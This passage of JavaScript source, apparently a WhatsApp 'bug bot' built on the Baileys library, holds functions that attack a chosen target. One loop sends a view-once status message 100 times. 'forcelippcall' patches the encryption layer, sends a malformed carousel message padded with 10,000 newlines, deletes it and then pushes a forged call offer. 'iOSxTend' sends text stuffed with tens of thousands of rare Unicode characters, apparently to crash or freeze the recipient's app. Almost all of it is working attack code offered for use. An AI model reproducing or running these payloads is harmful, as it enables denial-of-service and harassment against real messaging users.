            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      for (let i = 0; i < 100; i++) {
      await sleep(1000);
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msgx.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      }
   } catch (err) {
      console.error(err);
   }
};

async function forcelippcall(sock, target) {

    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("@whiskeysockets/baileys");

    let devices = (
        await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let xnxx = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch { }
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length)
            return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {

                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y)
                    msg = dsmMessage;

                let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

                return memek.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === 'pkmsg')
                        shouldIncludeDeviceIdentity = true;

                    return {
                        tag: 'to',
                        attrs: { jid },
                        content: [{
                            tag: 'enc',
                            attrs: { v: '2', type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

    let {
        nodes: destinations,
        shouldIncludeDeviceIdentity
    } = await sock.createParticipantNodes(
        devices,
        { conversation: "y" },
        { count: '0' }
    );

    let callNode = {
        tag: "call",
        attrs: {
            to: target,
            id: sock.generateMessageTag(),
            from: sock.user.id
        },
        content: [{
            tag: "offer",
            attrs: {
                "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                "call-creator": sock.user.id
            },
            content: [
                { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                {
                    tag: "video",
                    attrs: {
                        orientation: "0",
                        screen_width: "1920",
                        screen_height: "1080",
                        device_orientation: "0",
                        enc: "vp8",
                        dec: "vp8"
                    }
                },
                { tag: "net", attrs: { medium: "3" } },
                { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
                { tag: "encopt", attrs: { keygen: "2" } },
                { tag: "destination", attrs: {}, content: destinations },
                ...(shouldIncludeDeviceIdentity
                    ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                    }]
                    : []
                )
            ]
        }]
    };

    let NanMsg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 3,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16)
                    })
                },
                interactiveMessage: {
                    body: {
                        text: '( 🌷 ) lipp Officiall'
                    },
                    footer: {
                        text: '( 🌷 ) lipp Officiall'
                    },
                    carouselMessage: {
                        messageVersion: 1,
                        cards: [{
                            header: {
                                stickerMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                                    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                                    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                                    mimetype: "image/webp",
                                    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                                    fileLength: { low: 1, high: 0, unsigned: true },
                                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                                    firstFrameLength: 19904,
                                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                                    isAnimated: true,
                                    isAvatar: false,
                                    isAiSticker: false,
                                    isLottie: false,
                                    contextInfo: {
                                        mentionedJid: target,
                                    }
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: ' '
                            },
                            footer: {
                                text: ' '
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "\n".repeat(10000)
                            },
                            contextInfo: {
                                id: sock.generateMessageTag(),
                                forwardingScore: 999,
                                isForwarding: true,
                                participant: "0@s.whatsapp.net",
                                remoteJid: "X",
                                mentionedJid: ["0@s.whatsapp.net"]
                            }
                        }]
                    }
                }
            }
        }
    };

    const pertama = await sock.relayMessage(target, NanMsg, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
    
    await sock.sendMessage(target, { 
      delete: {
        fromMe: true,
        remoteJid: target,
        id: pertama,
      }
    });
    
    await sock.sendNode(callNode);
}

async function iOSxTend(sock, target) {
  const etc = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "💤‼️⃟⃰ᰧ./### ✩ > https://Wa.me/stickerpack/RaldzzXyz" + "𑇂𑆵𑆴𑆿".repeat(15000),
        matchedText: "https://Wa.me/stickerpack/RaldzzXyz",
        description:
          "҉҈⃝⃞⃟⃠⃤꙰꙲" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        title:
          "💤‼️⃟⃰ᰧ./### ✩" +
          "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      ephemeralExpiration: 5,
      timeStamp: Date.now(),
    }
  );

  await sock.relayMessage(target, etc.message, {
    messageId: etc.key.id,
  });
}